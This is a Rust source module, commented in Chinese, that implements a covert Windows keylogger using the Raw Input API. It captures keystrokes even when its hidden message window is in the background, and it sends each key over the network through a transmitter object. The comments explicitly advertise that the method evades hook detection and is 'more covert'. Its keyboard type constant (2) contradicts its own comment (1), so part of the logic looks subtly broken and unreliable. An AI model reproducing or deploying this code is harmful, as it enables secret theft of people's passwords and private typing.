// ============================================================================
// Raw Input 方式键盘监听模块
// ============================================================================
// 本模块实现了使用 Windows Raw Input API 来捕获键盘输入
// 
// Raw Input 是 Windows 提供的一种获取原始输入设备数据的方式
// 它允许应用程序直接从输入设备（键盘、鼠标等）接收原始数据
// 
// 工作原理：
// 1. 创建一个消息窗口（Message Window）
// 2. 使用 RegisterRawInputDevices 注册键盘设备
// 3. 当键盘事件发生时，窗口会收到 WM_INPUT 消息
// 4. 在窗口过程中处理 WM_INPUT 消息，解析键盘数据
// 
// 优点：
// - 不会被检测为钩子，更隐蔽
// - 不需要安装系统级的钩子
// 
// 缺点：
// - 需要创建窗口（虽然可以隐藏）
// - 需要消息循环
// ============================================================================

use crate::key_handler::vk_to_string;  // 按键转换函数
use crate::network::NetworkTransmitter;  // 网络传输器
use std::io::Write;     // 用于刷新标准输出
use std::sync::Arc;     // 原子引用计数

// ============================================================================
// Windows 结构体定义
// ============================================================================
// 这些结构体对应 Windows API 中的结构体
// #[repr(C)] 表示使用 C 语言的内存布局，确保与 Windows API 兼容

/// 原始输入设备结构体
/// 
/// 用于指定要注册的原始输入设备
/// 对应 Windows API 中的 RAWINPUTDEVICE 结构体
#[repr(C)]
pub struct RAWINPUTDEVICE {
    /// 用途页（Usage Page）
    /// 定义设备的类别
    /// 0x01 = 通用桌面设备（Generic Desktop Controls）
    pub usUsagePage: u16,
    
    /// 用途（Usage）
    /// 定义设备的具体类型
    /// 0x06 = 键盘（Keyboard）
    pub usUsage: u16,
    
    /// 设备标志
    /// RIDEV_INPUTSINK: 即使窗口不在前台也接收输入
    pub dwFlags: u32,
    
    /// 目标窗口句柄
    /// 接收 WM_INPUT 消息的窗口
    pub hwndTarget: isize,
}

/// 原始输入头部结构体
/// 
/// 包含原始输入数据的头部信息
/// 对应 Windows API 中的 RAWINPUTHEADER 结构体
#[repr(C)]
pub struct RAWINPUTHEADER {
    /// 设备类型
    /// RIM_TYPEMOUSE (0) = 鼠标
    /// RIM_TYPEKEYBOARD (1) = 键盘
    /// RIM_TYPEHID (2) = 其他 HID 设备
    pub dwType: u32,
    
    /// 整个 RAWINPUT 结构体的大小
    pub dwSize: u32,
    
    /// 设备句柄
    pub hDevice: isize,
    
    /// 消息的 wParam 参数
    pub wParam: usize,
}

/// 原始键盘数据结构体
/// 
/// 包含键盘输入的详细信息
/// 对应 Windows API 中的 RAWKEYBOARD 结构体
#[repr(C)]
pub struct RAWKEYBOARD {
    /// 扫描码
    /// 键盘硬件产生的扫描码
    pub MakeCode: u16,
    
    /// 标志位
    /// 0 = 按键按下
    /// 1 = 按键释放
    pub Flags: u16,
    
    /// 保留字段
    pub Reserved: u16,
    
    /// 虚拟键码
    /// Windows 虚拟键码
    pub VKey: u16,
    
    /// 对应的 Windows 消息
    /// 如 WM_KEYDOWN、WM_KEYUP 等
    pub Message: u32,
    
    /// 额外信息
    pub ExtraInformation: u32,
}

/// 原始输入数据结构体
/// 
/// 包含完整的原始输入数据
/// 对应 Windows API 中的 RAWINPUT 结构体
#[repr(C)]
pub struct RAWINPUT {
    /// 头部信息
    pub header: RAWINPUTHEADER,
    
    /// 键盘数据（联合体的一部分，我们只使用键盘）
    pub data: RAWKEYBOARD,
}

// ============================================================================
// 常量定义
// ============================================================================

/// 输入接收标志
/// 即使窗口不在前台也接收输入
pub const RIDEV_INPUTSINK: u32 = 0x00000100;

/// 原始输入消息
/// 当有原始输入事件时，窗口会收到此消息
pub const WM_INPUT: u32 = 0x00FF;

/// 键盘设备类型
pub const RIM_TYPEKEYBOARD: u32 = 2;

/// 消息窗口句柄
/// 用于创建仅接收消息的窗口（不显示）
pub const HWND_MESSAGE: isize = -3;

// ============================================================================
// Windows API 函数声明
// ============================================================================

/// 声明 user32.dll 中的函数
/// #[link(name = "user32")] 表示链接到 user32.dll
/// unsafe extern "system" 表示使用 Windows 调用约定
#[link(name = "user32")]
unsafe extern "system" {
    /// 注册原始输入设备
    /// 
    /// # 参数
    /// * `pRawInputDevices` - 设备数组指针
    /// * `uiNumDevices` - 设备数量
    /// * `cbSize` - RAWINPUTDEVICE 结构体大小
    /// 
    /// # 返回
    /// 成功返回非零，失败返回 0
    pub fn RegisterRawInputDevices(
        pRawInputDevices: *const RAWINPUTDEVICE,
        uiNumDevices: u32,
        cbSize: u32,
    ) -> i32;

    /// 获取原始输入数据
    /// 
    /// # 参数
    /// * `hRawInput` - 原始输入句柄（来自 WM_INPUT 的 lParam）
    /// * `uiCommand` - 命令标志（0 = 获取数据）
    /// * `pData` - 输出缓冲区
    /// * `pcbSize` - 缓冲区大小
    /// * `cbSizeHeader` - RAWINPUTHEADER 结构体大小
    /// 
    /// # 返回
    /// 成功返回数据大小，失败返回 -1
    pub fn GetRawInputData(
        hRawInput: isize,
        uiCommand: u32,
        pData: *mut RAWINPUT,
        pcbSize: *mut u32,
        cbSizeHeader: u32,
    ) -> u32;
}

// ============================================================================
// 全局变量
// ============================================================================

/// 网络传输器的全局引用
static mut NETWORK_TRANSMITTER: Option<Arc<NetworkTransmitter>> = None;

/// 设置网络传输器
/// 
/// 在主函数中调用，将网络传输器保存到全局变量
/// 
/// # 参数
/// * `transmitter` - 网络传输器的 Arc 引用
pub unsafe fn set_network_transmitter(transmitter: Arc<NetworkTransmitter>) {
    unsafe {
        NETWORK_TRANSMITTER = Some(transmitter);
    }
}

/// 处理原始输入
/// 
/// 当窗口收到 WM_INPUT 消息时调用此函数
/// 解析原始输入数据并处理键盘事件
/// 
/// # 参数
/// * `lparam` - WM_INPUT 消息的 lParam，包含原始输入句柄
pub unsafe fn handle_raw_input(lparam: isize) {
    unsafe {
        // 创建 RAWINPUT 结构体，初始化为零
        let mut raw_input: RAWINPUT = std::mem::zeroed();
        let mut size = std::mem::size_of::<RAWINPUT>() as u32;

        // 获取原始输入数据
        // lparam 是 WM_INPUT 消息传来的原始输入句柄
        let result = GetRawInputData(
            lparam,
            0,  // RID_INPUT = 0，获取输入数据
            &mut raw_input,
            &mut size,
            std::mem::size_of::<RAWINPUTHEADER>() as u32,
        );

        // 检查是否成功获取数据，且设备类型是键盘
        if result != 0 && raw_input.header.dwType == RIM_TYPEKEYBOARD {
            // 获取虚拟键码
            let vk_code = raw_input.data.VKey as u32;
            
            // 判断是否是按键按下
            // Flags == 0 表示按下，Flags == 1 表示释放
            let is_keydown = raw_input.data.Flags == 0;

            // 只处理按键按下事件
            if is_keydown {
                // 将虚拟键码转换为可读字符串
                let key_str = vk_to_string(vk_code, is_keydown);

                // 输出到控制台
                print!("{}", key_str);
                std::io::stdout().flush().unwrap();

                // 通过网络发送按键数据
                if let Some(ref transmitter) = NETWORK_TRANSMITTER {
                    if let Err(e) = transmitter.send(&key_str) {
                        eprintln!("网络发送失败：{}", e);
                    }
                }
            }
        }
    }
}
